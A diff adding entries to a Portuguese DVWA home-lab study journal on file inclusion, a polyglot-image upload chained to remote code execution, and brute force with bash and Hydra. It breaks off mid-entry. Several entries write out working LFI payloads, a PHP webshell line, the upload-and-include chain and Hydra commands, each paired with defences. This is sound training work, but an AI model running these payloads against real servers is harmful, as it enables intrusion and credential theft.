@@ -2411,7 +2411,1723 @@ Low e Medium totalmente comprometidos (RCE direto). High e Impossible resistem a
 
 ---
 
+## Entrada #41 — File Inclusion (nível Low) — LFI confirmado
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Abrir o módulo File Inclusion, testando o nível Low para confirmar Local File Inclusion (LFI) — módulo necessário também para desbloquear o encadeamento pendente com File Upload High/Impossible (Entradas #39–#40).
+
+### Ação executada
+
+1. **Diagnóstico prévio (fora do DVWA):** a VM Kali tinha perdido a rede do lab, voltando à rede de casa (`192.168.1.0/24`) — mesmo problema recorrente já registado antes. Corrigido reconfigurando o adaptador de rede da VM para o LAN Segment do lab e renovando o DHCP (`sudo dhclient -r eth0 && sudo dhclient eth0`), confirmando IP `192.168.10.102` via `ip a`.
+2. Sessão do DVWA tinha expirado entretanto — novo login com as credenciais por defeito (`admin` / `password`, sem alterações à password).
+3. DVWA Security → Low. Módulo **File Inclusion** aberto.
+4. **Teste 1 — path traversal relativo**, via browser e depois confirmado via `curl`:
+   ```
+   http://192.168.10.101/vulnerabilities/fi/?page=../../../../etc/passwd
+   ```
+5. **Teste 2 — caminho absoluto**, via `curl`:
+   ```
+   curl -s -b "PHPSESSID=...; security=low" "http://192.168.10.101/vulnerabilities/fi/?page=/etc/passwd"
+   ```
+
+### Resultado
+
+O traversal relativo (`../../../../etc/passwd`) **falhou**: página carregou normalmente, mas `<div id="main_body"><br /><br /></div>` — completamente vazio, sem qualquer aviso PHP visível. O caminho absoluto (`/etc/passwd`) **funcionou de imediato**: conteúdo completo do ficheiro devolvido — mas impresso **antes do próprio `<!DOCTYPE html>`** da página, não dentro do corpo. LFI confirmado no nível Low.
+
+**Verificação adicional de RFI (Remote File Inclusion):** consultada a página **PHP Info** do DVWA — `allow_url_include` está **`Off`**, tanto em *Local Value* como em *Master Value*. Isto significa que o motor PHP recusa incluir URLs remotas neste servidor, independentemente de a aplicação validar ou não o parâmetro `page`: o RFI está bloqueado ao nível do ambiente, não é uma defesa da aplicação. Não é possível testar RFI neste container — pendência fechada por limitação do ambiente, não por resistência do DVWA.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Correção de assunção inicial:** esperava que o traversal relativo funcionasse por defeito (padrão visto noutros materiais de estudo sobre DVWA). O falhanço não é uma defesa do Low (que não valida nada) — é só a profundidade real de pastas deste container Docker não corresponder ao número de `../` usado. Um caminho absoluto elimina essa incerteza e é o teste mais fiável para confirmar a vulnerabilidade em si.
+- **Padrão técnico novo face aos módulos anteriores:** o conteúdo do ficheiro incluído aparece *antes* do HTML da página — sinal de que o `include($_GET['page'])` corre logo no início do script, antes de qualquer output da página ser gerado. Em todos os módulos anteriores (SQLi, XSS, Command Injection, CSRF, File Upload) o resultado do ataque aparecia sempre dentro do corpo da página renderizada.
+
+**Consigo explicar isto a alguém?**
+  Porque é que o traversal relativo falhou mas o caminho absoluto funcionou, sem isso ser uma defesa: **Sim**.
+  Porque é que o conteúdo aparece antes do `<!DOCTYPE html>`: **Sim**.
+
+### Como nos podemos defender
+
+- Nunca usar um parâmetro controlado pelo utilizador diretamente como caminho de ficheiro num `include()`/`require()`.
+- **Whitelist** de valores permitidos para `page` (só aceitar nomes de ficheiro fixos e conhecidos, nunca o caminho literal vindo do pedido).
+- Desativar `allow_url_include` no PHP (previne RFI) e restringir `open_basedir`, limitando que ficheiros o PHP consegue mesmo ler, independentemente do caminho pedido.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** validação de entrada; princípio do menor privilégio no acesso a ficheiros do sistema
+- **CEH — D5 (Web Application Hacking):** LFI, leitura arbitrária de ficheiros do servidor
+
+### Próximos passos
+
+- [x] RFI verificado — `allow_url_include` está `Off` (Local e Master); RFI **não é possível** neste servidor, bloqueado ao nível do PHP, não da aplicação
+- [ ] File Inclusion nível Medium
+- [ ] Voltar ao encadeamento File Upload + File Inclusion, para tentar o compromisso completo do High/Impossible
+- [ ] Módulo Brute Force — último módulo da Fase 2
+
+---
+
+## Entrada #42 — File Inclusion (nível Medium) — mesmo resultado do Low
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Testar o File Inclusion no nível Medium, repetindo o payload de caminho absoluto que funcionou no Low, para perceber que filtro (se algum) o Medium acrescenta.
+
+### Ação executada
+
+1. DVWA Security → Medium.
+2. Repetição do mesmo payload via `curl`, agora com `security=medium`:
+   ```
+   curl -s -b "PHPSESSID=...; security=medium" "http://192.168.10.101/vulnerabilities/fi/?page=/etc/passwd"
+   ```
+
+### Resultado
+
+Resposta **idêntica** à do Low: conteúdo completo de `/etc/passwd` devolvido, impresso antes do `<!DOCTYPE html>`, com "Security Level: medium" confirmado no rodapé da página. Nenhuma restrição adicional face ao Low, para este payload em concreto.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Padrão de filtro identificado (consistente com o comportamento típico do DVWA):** o Medium deste módulo tipicamente remove apenas as strings `"http://"` e `"https://"` do valor de `page` — um filtro pensado para mitigar **RFI**, não LFI. O nosso payload é um caminho absoluto local, sem nenhum desses prefixos, por isso passa incólume. Não é "o Medium ser mais fraco do que devia" — é o filtro visar um tipo de ataque diferente do que estamos a usar.
+- **Consequência para o RFI:** como `allow_url_include` está `Off` ao nível do PHP (definição global do servidor, não do DVWA — Entrada #41), o RFI continua impossível neste nível e em todos os seguintes; não é necessário repetir esse teste a cada nível de segurança.
+
+**Consigo explicar isto a alguém?**
+  Porque é que um payload de caminho absoluto passa sem alterações por um filtro pensado para RFI: **Sim**.
+
+### Como nos podemos defender
+
+- Mesmas defesas já identificadas no Low (whitelist de valores para `page`, nunca o caminho literal).
+- **Reforço específico deste caso:** remover substrings específicas (`"http://"`, `"https://"`) é uma blacklist ingénua — protege só contra o padrão exato previsto, não contra a causa raiz (aceitar um caminho de ficheiro arbitrário). Mesmo princípio já visto no Command Injection Medium/High: bloquear texto não substitui validar o valor inteiro contra uma whitelist.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** blacklist vs. whitelist como estratégias de validação de entrada
+- **CEH — D5 (Web Application Hacking):** filtros de mitigação parcial (visam um vetor específico, RFI) que não cobrem vetores relacionados (LFI)
+
+### Próximos passos
+
+- [ ] File Inclusion nível High
+- [ ] File Inclusion nível Impossible
+- [ ] Voltar ao encadeamento File Upload + File Inclusion
+
+---
+
+## Entrada #43 — File Inclusion (nível High) — bypass via wrapper `file://`
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Testar o File Inclusion no nível High, cuja defesa é qualitativamente diferente das anteriores (não é blacklist de texto), e tentar contorná-la.
+
+### Ação executada
+
+1. DVWA Security → High.
+2. **Teste 1 (baseline):** repetição do payload absoluto que funcionou no Low/Medium:
+   ```
+   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/fi/?page=/etc/passwd"
+   ```
+   → **bloqueado**: `ERROR: File not found!`
+3. **Diagnóstico:** o High tipicamente usa `fnmatch("file*", $page)` — só aceita valores cuja *string* comece literalmente por `"file"` (ex.: `file1.php`, `file2.php`, `file3.php`) ou seja exatamente `"include.php"`. Já não é uma blacklist de substrings perigosas (como o Medium) — é uma verificação de prefixo do texto.
+4. **Bypass:** o wrapper de stream do PHP `file://` também começa pela string `"file"` — o mesmo teste de prefixo que aceita `file1.php` aceita também `file://`, mesmo sendo semanticamente outra coisa (um protocolo, não um nome de ficheiro). Testado:
+   ```
+   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/fi/?page=file:///etc/passwd"
+   ```
+   (três `/` — dois do protocolo `file://` mais o primeiro `/` do caminho absoluto)
+
+### Resultado
+
+O caminho absoluto puro (`/etc/passwd`) foi **bloqueado**. O mesmo caminho, prefixado com o wrapper `file://` (`file:///etc/passwd`), **funcionou de imediato** — conteúdo completo do `/etc/passwd` devolvido, impresso antes do `<!DOCTYPE html>`, "Security Level: high" confirmado no rodapé. High **comprometido por completo**, via confusão de prefixo.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Identificação correta do tipo de defesa antes de atacar:** ao ver `ERROR: File not found!` (mensagem nova, distinta do bloqueio silencioso do Low e da ausência de filtro do Medium), reconheci que era um tipo de validação diferente — não bastava um caminho diferente, era preciso perceber a lógica exata da verificação antes de tentar contornar.
+- **Bypass por confusão de prefixo:** uma verificação `fnmatch("file*", ...)` testa literalmente os primeiros carateres da string, sem perceber que `"file"` também é o início válido de um **wrapper de protocolo** do PHP (`file://`), que tem semântica completamente diferente de um nome de ficheiro. É o mesmo princípio de falha já visto no MIME type (Entrada #38) e nos filtros de blacklist (Command Injection): validar **a forma/aparência** de um valor, sem entender **o que ele realmente representa** para o interpretador por trás.
+
+**Consigo explicar isto a alguém?**
+  Porque é que uma verificação `fnmatch("file*", ...)` pensada para só aceitar `file1.php`, `file2.php`, etc., deixa passar `file:///etc/passwd`: **Sim**.
+  A ligação a outras falhas já vistas (validar aparência do texto, não o significado real do valor): **Sim**.
+
+### Como nos podemos defender
+
+- Nunca validar caminhos de ficheiro por **prefixo de string** (`fnmatch`, `strpos`, etc.) — usar sempre uma **whitelist por igualdade exata** (`in_array($page, ['file1.php','file2.php','file3.php'], true)`).
+- Resolver o caminho com `realpath()` e confirmar que o resultado fica **dentro** do diretório esperado, antes de o incluir — isto invalida automaticamente qualquer wrapper de protocolo ou traversal.
+- Especificamente contra wrappers PHP: restringir com `stream_wrapper_restrict` ou, mais simples, nunca passar entrada do utilizador diretamente para `include()`/`require()` — usar sempre um mapeamento indireto (ex.: um `switch` ou array associativo de chaves conhecidas para caminhos fixos).
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** validação por whitelist exata vs. verificação de padrão/prefixo; canonicalização de caminhos (`realpath`)
+- **CEH — D5 (Web Application Hacking):** bypass de filtros via wrappers de protocolo PHP (`file://`, `php://`, `data://`)
+
+### Próximos passos
+
+- [ ] File Inclusion nível Impossible
+- [ ] Voltar ao encadeamento File Upload + File Inclusion
+
+---
+
+## Entrada #44 — File Inclusion (nível Impossible) — fecha o módulo File Inclusion
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Testar o File Inclusion contra a defesa de nível Impossible, tentando o mesmo bypass que comprometeu o High.
+
+### Ação executada
+
+1. DVWA Security → Impossible.
+2. **Teste 1 — repetição do bypass do High**, via `curl`:
+   ```
+   curl -s -b "PHPSESSID=...; security=impossible" "http://192.168.10.101/vulnerabilities/fi/?page=file:///etc/passwd"
+   ```
+3. **Teste 2 — confirmação com um valor legítimo da própria aplicação** (para distinguir "bloqueio total" de "whitelist seletiva"):
+   ```
+   curl -s -b "PHPSESSID=...; security=impossible" "http://192.168.10.101/vulnerabilities/fi/?page=file1.php"
+   ```
+
+### Resultado
+
+O bypass `file:///etc/passwd`, que tinha funcionado no High, foi **bloqueado**: `ERROR: File not found!` — mesma mensagem do bloqueio inicial do High, mas agora também aplicada ao wrapper `file://`. O valor legítimo `file1.php` **funcionou normalmente**, devolvendo o conteúdo esperado da aplicação ("File 1", IP do utilizador) dentro do corpo normal da página — confirmando que não é um bloqueio total do módulo, é uma **whitelist seletiva**: só passam os valores que a aplicação realmente espera.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Distinção entre "validação de prefixo" (High) e "whitelist exata" (Impossible):** o High usava `fnmatch("file*", ...)`, testando só o início da string — por isso `file://` (que também começa por "file") passava. O Impossible parece comparar o valor recebido por **igualdade exata** contra um conjunto fixo de valores esperados (`include.php`, `file1.php`, `file2.php`, `file3.php`), rejeitando tudo o resto — incluindo qualquer wrapper de protocolo, por mais criativo que seja o prefixo.
+- **Metodologia reforçada:** testar um valor legítimo a par do payload de ataque (não só "o ataque falhou", mas "a funcionalidade normal continua a funcionar") foi importante para confirmar que a defesa é seletiva e não um bloqueio genérico do módulo — mesmo raciocínio de rigor já aplicado nas Entradas #38/#39 ao distinguir ficheiros novos de antigos.
+
+**Consigo explicar isto a alguém?**
+  Diferença entre a defesa do High (verificação de prefixo, contornável) e a do Impossible (whitelist por igualdade exata, não contornável por wrappers): **Sim**.
+
+### Como nos podemos defender
+
+- Confirma, na prática, a recomendação já registada no guia: **whitelist por igualdade exata** (`in_array($page, [...], true)`), nunca verificação de prefixo/padrão.
+- Esta é a mesma lição geral já vista repetidamente no laboratório (CSRF Impossible, File Upload Impossible): a defesa mais robusta não é "adicionar mais uma regra" a um filtro de blacklist, é mudar a abordagem para validação positiva (só aceitar o que é explicitamente permitido).
+
+### Balanço do módulo File Inclusion (Low → Impossible)
+
+Low e Medium totalmente comprometidos com um caminho absoluto simples (LFI direto). High comprometido via bypass do wrapper `file://` (confusão de prefixo). Impossible resistiu por completo, com whitelist exata que rejeita qualquer valor fora do conjunto esperado pela aplicação — incluindo o bypass que tinha funcionado no High. RFI confirmado como impossível em todos os níveis, por definição global do PHP (`allow_url_include` `Off`). Módulo fechado. Consolidação em [`guias-estudo/guia-estudo-file-inclusion.md`](./guias-estudo/guia-estudo-file-inclusion.md).
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** whitelist por igualdade exata como padrão-ouro de validação de entrada
+- **CEH — D5 (Web Application Hacking):** encerramento de vetores LFI/RFI; validação positiva vs. filtros de padrão
+
+### Próximos passos
+
+- [ ] Atualizar `guia-estudo-file-inclusion.md` com o nível Impossible
+- [ ] Voltar ao encadeamento File Upload High/Impossible + File Inclusion, para tentar o compromisso completo pendente
+- [ ] Módulo **Brute Force** — último módulo da Fase 2
+
+---
+
+## Entrada #45 — Encadeamento File Upload + File Inclusion (nível High) — RCE completo
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Fechar a pendência em aberto desde a Entrada #39: comprometer por completo o File Upload no nível High, encadeando com o File Inclusion (o bypass do MIME type sozinho já não chegava — Entradas #38–#39).
+
+### Ação executada
+
+1. **Criação do ficheiro "polyglot"** no Kali: uma imagem `.jpg` genuína e válida (`convert -size 10x10 xc:blue tiny.jpg`, via ImageMagick), com o payload PHP colado a seguir aos dados da imagem:
+   ```
+   echo '<?php system($_GET["cmd"]); ?>' > payload.php
+   cat tiny.jpg payload.php > polyglot.jpg
+   ```
+   Confirmado com `file polyglot.jpg` que continua a ser reconhecido como JPEG válido (o comando `file` só lê o cabeçalho, ignora o que vem a seguir).
+2. **Upload do polyglot** via `curl`, com `security=high`, **sem qualquer disfarce de MIME type** (a imagem já é genuína):
+   ```
+   curl -s -b "PHPSESSID=...; security=high" -F "MAX_FILE_SIZE=100000" -F "uploaded=@polyglot.jpg;type=image/jpeg" -F "Upload=Upload" "http://192.168.10.101/vulnerabilities/upload/#"
+   ```
+   → aceite: `../../hackable/uploads/polyglot.jpg succesfully uploaded!`
+3. **Inclusão do ficheiro carregado**, via o bypass `file://` do File Inclusion High (Entrada #43), apontando para o caminho absoluto no container (`/var/www/html`, raiz padrão do Apache/Debian):
+   ```
+   curl -s -b "PHPSESSID=...; security=high" "http://192.168.10.101/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/polyglot.jpg&cmd=whoami" --output resultado.bin
+   strings resultado.bin | grep -i "www-data"
+   ```
+   (a resposta contém bytes binários da imagem — `curl` recusa-se a mostrar diretamente no terminal; guardado em ficheiro e pesquisado com `strings`.)
+
+### Resultado
+
+**RCE confirmado.** `www-data` aparece na saída, logo a seguir ao marcador `JFIF` do cabeçalho JPEG — o código PHP escondido dentro do ficheiro de imagem foi executado pelo `include()`, apesar de a extensão ser `.jpg` e o ficheiro ser uma imagem genuína e válida. **Compromisso completo do File Upload High**, através do File Inclusion.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **A validação do File Upload High e a execução do File Inclusion avaliam coisas completamente diferentes:** o Upload confirma "isto é uma imagem válida?" (sim — `getimagesize()` ou equivalente só olha ao início do ficheiro); o `include()` do File Inclusion não verifica "isto é uma imagem?" nenhuma — lê o ficheiro todo e executa qualquer `<?php ?>` que encontrar, seja qual for a extensão. As duas defesas, cada uma sozinha correta para o que verifica, deixam um buraco quando combinadas.
+- **Confirma a previsão registada no guia do File Upload** (Entrada #39): "um compromisso completo do High parece exigir encadear outra vulnerabilidade, não mais esforço no mesmo ataque" — exatamente o que aconteceu.
+
+**Consigo explicar isto a alguém?**
+  Porque é que uma imagem genuína, com código escondido a seguir aos dados da imagem, consegue executar código quando incluída, apesar de nunca poder ser corrida diretamente como `.php`: **Sim**.
+
+### Como nos podemos defender
+
+- **Nunca basta validar cada vulnerabilidade isoladamente** — a defesa em profundidade exige pensar em combinações entre módulos/funcionalidades, não só em cada filtro individual.
+- Específico deste caso: mesmo com upload validado como imagem genuína, **nunca guardar uploads num diretório que o `include()`/`require()` da aplicação consiga alcançar** — separar fisicamente a área de uploads de qualquer caminho usado por funcionalidades de inclusão de ficheiros.
+- Reforça, mais uma vez, a defesa central do File Inclusion: whitelist exata de valores para `page` (como no Impossible), que teria bloqueado este ataque por completo, independentemente do que estivesse guardado nos uploads.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** defesa em profundidade; combinação de vulnerabilidades individualmente mitigadas
+- **CEH — D5 (Web Application Hacking):** técnica de "polyglot file" / encadeamento Upload + LFI para RCE, técnica real e documentada (OWASP)
+
+### Próximos passos
+
+- [ ] Testar o mesmo encadeamento no nível **Impossible** (upload com token anti-CSRF + tentativa de inclusão contra a whitelist exata) — hipótese: a whitelist do File Inclusion Impossible bloqueia por completo, independentemente do File Upload
+- [ ] Módulo **Brute Force** — último módulo da Fase 2
+
+---
+
+## Entrada #46 — Encadeamento File Upload + File Inclusion (nível Impossible) — bloqueado, pendência fechada
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Confirmar se o encadeamento que comprometeu o File Upload High (Entrada #45) também funciona contra o Impossible, fechando de vez a pendência aberta desde a Entrada #39.
+
+### Ação executada
+
+Reutilizado o `polyglot.jpg` já carregado (Entrada #45 — o nível de segurança do Upload não apaga ficheiros já guardados), tentando incluí-lo com `security=impossible`:
+```
+curl -s -b "PHPSESSID=...; security=impossible" "http://192.168.10.101/vulnerabilities/fi/?page=file:///var/www/html/hackable/uploads/polyglot.jpg&cmd=whoami"
+```
+
+### Resultado
+
+**Bloqueado**, como previsto: `ERROR: File not found!` — a mesma resposta da whitelist exata do File Inclusion Impossible (Entrada #44), que só aceita `include.php`, `file1.php`, `file2.php` ou `file3.php`. O nome do ficheiro carregado nunca poderia constar dessa lista fixa, por isso o encadeamento **não é possível** neste nível, independentemente do que o File Upload aceitar.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **Confirmação de uma previsão feita antes do teste** (não só depois): ao prever corretamente que a whitelist bloquearia isto, ficou confirmado o modelo mental construído nas Entradas #44/#45 — a defesa mais forte contra este tipo de encadeamento não está no módulo que é atacado por último (Upload), está no elo intermédio que o ataque precisa de atravessar (Inclusion). Bloquear um único elo da cadeia é suficiente para proteger o conjunto todo, mesmo que outras partes continuem tecnicamente "fracas".
+- **Lição de arquitetura de defesa:** o File Upload Impossible provavelmente continua vulnerável a upload de imagens genuínas com payload escondido (não testado ao detalhe aqui) — mas isso deixa de importar, porque não há forma de o ativar sem um File Inclusion também comprometido. Uma vulnerabilidade "adormecida" sem vetor de ativação não é explorável na prática.
+
+**Consigo explicar isto a alguém?**
+  Porque é que basta uma defesa forte num só elo da cadeia (File Inclusion) para proteger o conjunto, mesmo que o outro elo (File Upload) continue a aceitar o ficheiro malicioso: **Sim**.
+
+### Como nos podemos defender
+
+- Confirma a conclusão já registada na Entrada #45: a whitelist exata do File Inclusion é, por si só, suficiente para travar este tipo de encadeamento — reforça a prioridade dessa defesa em concreto.
+- Princípio geral de defesa em profundidade: nem sempre é preciso (ou possível) fechar todas as vulnerabilidades individuais — travar um elo crítico da cadeia de ataque pode neutralizar o conjunto.
+
+### Balanço do encadeamento File Upload + File Inclusion
+
+**Pendência fechada.** High: comprometido por completo via ficheiro polyglot + bypass `file://` (Entrada #45). Impossible: o encadeamento falha, bloqueado pela whitelist exata do File Inclusion (esta entrada). Consolidação a acrescentar aos guias de [`File Upload`](./guias-estudo/guia-estudo-file-upload.md) e [`File Inclusion`](./guias-estudo/guia-estudo-file-inclusion.md).
+
+### Domínios relacionados
+
+- **Security+ — D2 / D4:** defesa em profundidade; um elo forte pode neutralizar uma cadeia de ataque
+- **CEH — D5 (Web Application Hacking):** limites práticos do encadeamento de vulnerabilidades (kill chain interrompida num elo intermédio)
+
+### Próximos passos
+
+- [ ] Atualizar os guias de File Upload e File Inclusion com a conclusão do encadeamento
+- [ ] Módulo **Brute Force** — último módulo pendente da Fase 2
+
+---
+
+## Entrada #47 — Brute Force (nível Low) — ataque automatizado bem-sucedido
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Abrir o módulo Brute Force, testando o nível Low com um ataque de dicionário automatizado simples, feito à mão com um ciclo `for` em bash (antes de usar uma ferramenta dedicada como o Hydra).
+
+### Ação executada
+
+1. DVWA Security → Low. Módulo **Brute Force** aberto.
+2. **Teste de controlo:** login com password propositadamente errada, para identificar a mensagem de falha. O browser complicou este passo por preencher a password automaticamente (sempre com o valor correto guardado); confirmado em vez disso via `curl`:
+   ```
+   curl -s -b "PHPSESSID=...; security=low" "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=123456&Login=Login"
+   ```
+   → mensagem de falha identificada: `Username and/or password incorrect.` (a de sucesso, já vista no browser antes, é `Welcome to the password protected area <username>`).
+3. **Wordlist pequena**, criada manualmente:
+   ```
+   cat > wordlist.txt << 'EOF'
+   123456
+   admin
+   letmein
+   qwerty
+   password
+   EOF
+   ```
+4. **Ciclo de ataque**, em bash, testando cada password da lista contra o utilizador `admin`:
+   ```
+   for pass in $(cat wordlist.txt); do
+     curl -s -b "PHPSESSID=...; security=low" "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=${pass}&Login=Login" | grep -o "Username and/or password incorrect\|Welcome to the password protected area"
+   done
+   ```
+
+### Resultado
+
+As primeiras quatro tentativas (`123456`, `admin`, `letmein`, `qwerty`) devolveram a mensagem de falha. A quinta (`password`) devolveu a mensagem de boas-vindas — **password correta encontrada por força bruta**, em segundos, sem qualquer intervenção manual repetida.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **A vulnerabilidade aqui não é uma falha de código complexa** (como nos módulos anteriores) — é a **ausência total de travões** ao processo: o servidor aceitou e processou todas as tentativas instantaneamente, sem bloqueio de conta, sem CAPTCHA, sem atraso crescente entre pedidos. Um processo trivial (testar passwords uma a uma) só se torna perigoso quando não há nada a limitá-lo.
+- **Diferença de género face aos módulos anteriores:** SQLi, Command Injection, XSS, CSRF, File Upload e File Inclusion exploravam todos uma falta de *validação* de um input específico. O Brute Force explora a falta de *limitação de taxa* (rate limiting) — uma categoria de defesa nova, que ainda não tinha aparecido no laboratório.
+
+**Consigo explicar isto a alguém?**
+  Porque é que o Brute Force é uma categoria de vulnerabilidade diferente das anteriores (ausência de travões, não falha de validação): **Sim**.
+  O mecanismo do ciclo `for` em bash a automatizar o ataque: **Sim**.
+
+### Como nos podemos defender
+
+- **Bloqueio de conta** após um número de tentativas falhadas (temporário ou permanente até ação do utilizador).
+- **Atraso crescente** entre tentativas falhadas (rate limiting), tornando um ataque de força bruta impraticavelmente lento.
+- **CAPTCHA** após algumas tentativas falhadas, para distinguir humano de automação.
+- **Autenticação multifator (MFA)** — mesmo que a password seja adivinhada, não chega sozinha.
+- **Políticas de password fortes**, para que o espaço de tentativas necessário seja demasiado grande para ser prático.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D3:** ataques de autenticação; controlos de bloqueio de conta e MFA
+- **CEH — D3 (System Hacking):** ataques de password (dicionário, força bruta)
+
+### Próximos passos
+
+- [ ] Repetir o ataque com o **Hydra** (ferramenta padrão da indústria para brute force), em vez do ciclo manual em bash
+- [ ] Brute Force nível Medium
+- [ ] Brute Force nível High e Impossible
+
+---
+
+## Entrada #48 — Brute Force (nível Low) com Hydra — ferramenta profissional
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Repetir o ataque de força bruta da Entrada #47, agora com o **Hydra** (ferramenta padrão da indústria), em vez do ciclo manual em bash — para aprender a sintaxe da ferramenta e perceber o que ela acrescenta face ao método artesanal.
+
+### Ação executada
+
+1. Confirmado que o Hydra está instalado (`hydra -h` → v9.7, vem por defeito no Kali).
+2. Construção do comando para o módulo `http-get-form`. **Várias tentativas falhadas por erros de sintaxe** (ver secção seguinte) antes de acertar.
+3. Consulta da ajuda do próprio módulo (`hydra -U http-get-form`), que revelou a regra correta de ordenação dos campos.
+4. Comando final que funcionou:
+   ```
+   hydra -l admin -P wordlist.txt 192.168.10.101 http-get-form "/vulnerabilities/brute/:username=admin&password=^PASS^&Login=Login:H=Cookie\: security=low; PHPSESSID=...:incorrect"
+   ```
+
+### Resultado
+
+`[80][http-get-form] host: 192.168.10.101   login: admin   password: password` — `1 valid password found`. Mesma password encontrada que no ataque manual (Entrada #47), agora através da ferramenta dedicada.
+
+### Deduções e raciocínio (certos e corrigidos)
+
+- **A sintaxe do `http-get-form` do Hydra tem uma regra que não era óbvia e custou várias tentativas:** os campos são separados por `:`, e a **condição de falha tem de ser SEMPRE o último campo**. Os parâmetros opcionais (como o cabeçalho `H=` com a cookie) vão **entre** os parâmetros do formulário e a condição de falha — não depois dela. O erro inicial foi pôr a cookie a seguir à condição, o que fazia o Hydra tentar interpretar o `H=Cookie...` como se fosse a própria condição (`no valid optional parameter type given: F`).
+- **Estrutura correta:** `url : parâmetros_do_form : H=cabeçalho : condição_de_falha`.
+- **Escaping:** qualquer `:` dentro de um valor (ex.: no cabeçalho `Cookie: ...`) tem de ser escapado com `\:`, senão o Hydra lê-o como mais um separador de campo.
+- **Marcadores:** `^PASS^` (e `^USER^`) é onde o Hydra injeta cada tentativa da wordlist; `-l` fixa um utilizador, `-P` aponta o ficheiro de passwords.
+- **O que o Hydra acrescenta face ao ciclo bash (Entrada #47):** paralelismo (várias tentativas em simultâneo, `-t`), suporte a muitos protocolos além de HTTP (SSH, FTP, RDP, etc.), gestão automática de cookies/redirects, e output limpo. Para uma wordlist pequena o ganho não se nota; para milhões de entradas, é a diferença entre prático e impraticável.
+
+**Consigo explicar isto a alguém?**
+  A regra de ordenação dos campos no `http-get-form` (condição de falha sempre no fim) e porque é que o erro acontecia: **Sim**.
+  O que o Hydra faz que o ciclo bash não faz (paralelismo, multi-protocolo): **Sim**.
+
+### Como nos podemos defender
+
+- As mesmas defesas da Entrada #47 (bloqueio de conta, rate limiting, CAPTCHA, MFA, políticas de password fortes) — nenhuma delas foi acionada, por isso o Hydra correu sem obstáculos.
+- Nota defensiva importante: ferramentas como o Hydra são triviais de usar por um atacante. A defesa **nunca** pode depender de "o atacante não vai conseguir automatizar" — tem de assumir automação total e tornar o *volume* de tentativas impraticável ou detetável.
+
+### Domínios relacionados
+
+- **Security+ — D2 / D3:** ataques de autenticação automatizados; necessidade de controlos de rate limiting e MFA
+- **CEH — D3 (System Hacking):** uso de ferramentas de brute force (Hydra) contra formulários web
+
+### Próximos passos
+
+- [ ] Brute Force nível Medium (verificar se acrescenta atraso/rate limiting)
+- [ ] Brute Force nível High e Impossible (High costuma introduzir token anti-CSRF, que complica o Hydra)
+
+---
+
+## Entrada #49 — Brute Force (nível Medium) — defesa por atraso (rate limiting rudimentar)
+
+**Data/hora:** 2026-08-17
+
+**Máquinas ligadas:** OPNsense (gateway/DHCP do segmento Ciber), Kali Atacante, Servidor Vulnerável (`192.168.10.101`)
+
+### Objetivo / Propósito
+
+Testar o Brute Force no nível Medium e identificar, medindo, que defesa acrescenta face ao Low.
+
+### Ação executada
+
+1. DVWA Security → Medium.
+2. **Medição do tempo de resposta a um login falhado**, com `time`, no Medium e no Low para comparar:
+   ```
+   time curl -s -b "PHPSESSID=...; security=medium" "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=erro123&Login=Login" | grep -o "incorrect"
+   time curl -s -b "PHPSESSID=...; security=low"    "http://192.168.10.101/vulnerabilities/brute/?username=admin&password=erro123&Login=Login" | grep -o "incorrect"
+   ```
+3. **Ataque com Hydra** contra o Medium (mesmo comando da Entrada #48, só a trocar `security=low` por `security=medium`).
+
+### Resultado
+
+- **Tempo de resposta a uma falha:** Medium = `2,013s`; Low = `0,040s` — cerca de **50× mais lento** no Medium. Confirma um atraso artificial de ~2 segundos (`sleep(2)`) imposto a cada tentativa falhada.
+- **Hydra:** encontrou a mesma password (`admin` / `password`), mas o ataque demorou **~8 segundos** (16:26:11 → 16:26:19) contra o instantâneo do Low. Diferença já visível com só 5 passwords.
+
+### Deduções e raciocínio (certos e corrigidos)
+
